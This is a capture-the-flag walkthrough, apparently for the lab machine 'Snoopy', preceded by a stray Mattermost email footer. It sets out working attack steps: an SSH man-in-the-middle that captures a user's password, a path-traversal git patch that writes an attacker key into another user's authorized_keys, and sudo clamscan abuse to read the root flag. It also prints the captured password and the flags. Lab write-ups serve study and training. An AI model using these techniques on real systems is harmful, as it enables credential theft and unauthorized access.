b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"emailFooter" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 12px; line-height: 16px; color: rgb='
b'a(63, 67, 80, 0.56); padding: 8px 24px 8px 24px;">'
b'                                    =C2=A9 2022 Mattermost, Inc. 530 Lytton='
b' Avenue, Second floor, Palo Alto, CA, 94301'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'            </td>'
b'          </tr>'
b'        </tbody>'
b'      </table>'
b'    </div>'
b'   =20'
b'  </div>'
b'</body>'
b''
b'</html>'
b''
b''
b'--6328f724b0112dbf8bc485f578ac5e6877360108638925e93cd51db5580e--'
------------ END MESSAGE ------------
```

So cbrown is the one in charge for server-provisioning as i understnad from the channels

Using ssh-mitm from github

[GitHub - ssh-mitm/ssh-mitm: ssh mitm server for security audits supporting public key authentication, session hijacking and file manipulation](https://github.com/ssh-mitm/ssh-mitm)

Used the server-provision command from cbrown from mattermost for a ssh-mitm attack

**Installed the ssh-mitm from git and used a python env to install all the needed requirements**

`ssh-mitm server --remote-host 10.129.221.81`

**And started a socat listener locally**

`socat TCP-LISTEN:2222,fork TCP:127.0.0.1:10022`

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0b062239-9847-4866-86ea-0c7b196a0430/Untitled.png)

From the output we get a password

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e7d3aaa-4197-4cc9-9dd4-345a769ee862/Untitled.png)

```python
ssh-ed25519                                        
                    INFO     Remote authentication succeeded      
                                     Remote Address: 10.129.221.81:22           
                                     Username: cbrown                           
                                     Password: sn00pedcr3dential!!!             
                                     Agent: no agent
```

We can now ssh into the machine

### cbrown: sn00pedcr3dential!!!

`git diff > my_changes.patch`

`git apply my_changes.patch`

```
git apply --directory=/path/to/other/directory my_changes.patch

```

Understanding patch file from git

When you run **`git diff`** and subsequently create a patch file between two commits where a new file was added, the patch file includes this information. Then, when the patch is applied with **`git apply`**, the new file will be created.

Here's an example workflow:

1. **Create a new file and commit it**:
    
    ```
    echo "This is a new file" > newfile.txt
    git add newfile.txt
    git commit -m "Add a new file"
    ```
    
2. **Make a change and commit it**:
    
    ```
    echo "An additional line" >> newfile.txt
    git commit -am "Update the new file"
    ```
    
3. **Create a patch file for the last commit**:
    
    ```
    git diff HEAD^ HEAD > changes.patch
    ```
    
    This command creates a patch file that represents the changes made in the last commit (**`HEAD^`** means the commit before the last one, and **`HEAD`** means the last commit).
    
4. **Apply the patch file in another repository or directory**:
    
    ```
    git apply changes.patch
    ```
    
    This command will apply the changes from the patch file to the current working directory, creating the new file in the process.
    
    Remember, however, that a patch file doesn't track the entire file content but the differences between two sets of code. If a file was created in the course of those changes, then yes, the patch can create a file when applied.
    
    trying the patch command to add a key to the file
    
    `-directory=/home/sbrown/.ssh/authorized_keys`
    
    Example
    
    You should ensure you're working on a test system or have taken appropriate backups before proceeding. Here's how you can create such a patch:
    
    1. **Create a new authorized_keys file with your key in it**:
        
        ```
        echo "your-public-key" > authorized_keys
        ```
        
        Replace **`"your-public-key"`** with your actual public key.
        
    2. **Initialize a new Git repository and commit the file**:
        
        ```
        git init
        git add authorized_keys
        git commit -m "Add authorized_keys"
        ```
        
    3. **Create a patch file**:
        
        ```
        git format-patch -1 HEAD
        ```
        
        This will create a **`.patch`** file in your current directory.
        
    
    Then, to apply the patch:
    
    1. **Navigate to the `/home/dam/.ssh/` directory**:
        
        ```
        cd /home/dam/.ssh/
        ```
        
    2. **Apply the patch**:
        
        ```
        git apply /path/to/your.patch
        ```
        
        Replace **`/path/to/your.patch`** with the actual path to the patch file you created.
        
    
    Generating the key pair locally
    
    `ssh-keygen -t rsa -m PEM`
    
    `echo ‘ public key‘ > authorized_keys`
    
    Check with diff
    
    ```python
    cbrown@snoopy:/tmp$ git diff --no-index authorized_keys /dev/null
    diff --git a/authorized_keys b/authorized_keys
    deleted file mode 100644
    index 0424988..0000000
    --- a/authorized_keys
    +++ /dev/null
    @@ -1 +0,0 @@
    -ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfau3n+y15Uhqb50qSTRpkaieczZqNpbrX2YxnRvJuA94DBz1E776879s74OpAD30kmjT/2imWau7oevhlfwXF07xHvv+abaqmWg1PXuPPuR4hy8JcUcC8K709U2a0MsbVABeXYBY6qmkjMU0iey38OoBmYSbDddPBicu1aEB0T6aRA30Zo7eFryRpYMLJJyStstyYSSdS/K2QG36C9Mnf4FrYU44SXBxNRVIrOUi8edeDqpIYoeBbuA6tBYiqCoqXiktMWDh1nxXb58M9iwyh0FFrNcuIvCoFMy2fbBCKi3+xtdwmCBdh2MufR/DMxQi6wFhxns1mX53N45j3SKASAsM8YPHbz9coLnSpA9ZVae51/J4WkFKyYaYSQigy6OVvNTZeSY07lXySDlCLQRBbpt9aisgH5VzhBa9YQzNthV/4Bb7oYZjqlp/SJS4I+IizDD3L7ZcxXMbipkIHpaoUapW6E1S+lkcga4tIXCVQ/WD0Nxz9vq+pF0zmrX/n058= htb-yougotgot@htb-yiza8ymh2p
    ```
    
    Creating the patch file
    
    `git diff --no-index /dev/null authorized_keys > authorized_keys.patch`
    
    Since the authorized keys file does not exit we need to create it ourself with modifying the file we created and adding the absolute path to the authorized_keys
    
    `a/../../../../home/sbrown/.ssh/authorized_keys`
    
    ```python
    diff --git a/../../../../home/sbrown/.ssh/authorized_keys b/../../../../home/sbrown/.ssh/authorized_keys
    new file mode 100644
    index 0000000..0424988
    --- /dev/null
    +++ b/../../../../home/sbrown/.ssh/authorized_keys
    @@ -0,0 +1 @@
    +ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfau3n+y15Uhqb50qSTRpkaieczZqNpbrX2YxnRvJuA94DBz1E776879s74OpAD30kmjT/2imWau7oevhlfwXF07xHvv+abaqmWg1PXuPPuR4hy8JcUcC8K709U2a0MsbVABeXYBY6qmkjMU0iey38OoBmYSbDddPBicu1aEB0T6aRA30Zo7eFryRpYMLJJyStstyYSSdS/K2QG36C9Mnf4FrYU44SXBxNRVIrOUi8edeDqpIYoeBbuA6tBYiqCoqXiktMWDh1nxXb58M9iwyh0FFrNcuIvCoFMy2fbBCKi3+xtdwmCBdh2MufR/DMxQi6wFhxns1mX53N45j3SKASAsM8YPHbz9coLnSpA9ZVae51/J4WkFKyYaYSQigy6OVvNTZeSY07lXySDlCLQRBbpt9aisgH5VzhBa9YQzNthV/4Bb7oYZjqlp/SJS4I+IizDD3L7ZcxXMbipkIHpaoUapW6E1S+lkcga4tIXCVQ/WD0Nxz9vq+pF0zmrX/n058= htb-yougotgot@htb-yiza8ymh2p
    ```
    
    Once done that we can apply the patch with the sbrown user
    
    `sudo -u sbrown git apply authorized_keys.patch --unsafe-paths`
    
    Now going back to our attack machine, we can 
    
    `chmod 600 id_rsa`
    
    and ssh
    
    `ssh -i id_rsa sbrown@snoopy.htb`
    
    ### user.txt: 2c3cf4036fcefa85049ed222730bee17
    
    ---
    
    ---
    
    ---
    
    Path to root:
    
    Trying the following
    
    `sudo -l`
    
    We can run 
    
    `/usr/local/bin/clamscan` 
    
    So lets try to parse for the flag with the scan…
    
    ```python
    sbrown@snoopy:~$ sudo /usr/local/bin/clamscan -f /root/root.txt --copy=/tmp/
    LibClamAV Warning: **************************************************
    LibClamAV Warning: ***  The virus database is older than 7 days!  ***
    LibClamAV Warning: ***   Please update it as soon as possible.    ***
    LibClamAV Warning: **************************************************
    Loading:    20s, ETA:   0s [========================>]    8.66M/8.66M sigs       
    Compiling:   6s, ETA:   0s [========================>]       41/41 tasks 
    
    20391bb79940b005e526d52febe429eb: No such file or directory
    WARNING: 20391bb79940b005e526d52febe429eb: Can't access file
    
    ----------- SCAN SUMMARY -----------
    Known viruses: 8659055
    Engine version: 1.0.0
    Scanned directories: 0
    Scanned files: 0
    Infected files: 0
    Data scanned: 0.00 MB
    Data read: 0.00 MB (ratio 0.00:1)
    Time: 28.576 sec (0 m 28 s)
    Start Date: 2023:05:10 20:26:41
    End Date:   2023:05:10 20:27:10
    ```
    
    And this is the root flag!
    
    ### root.txt: 20391bb79940b005e526d52febe429eb
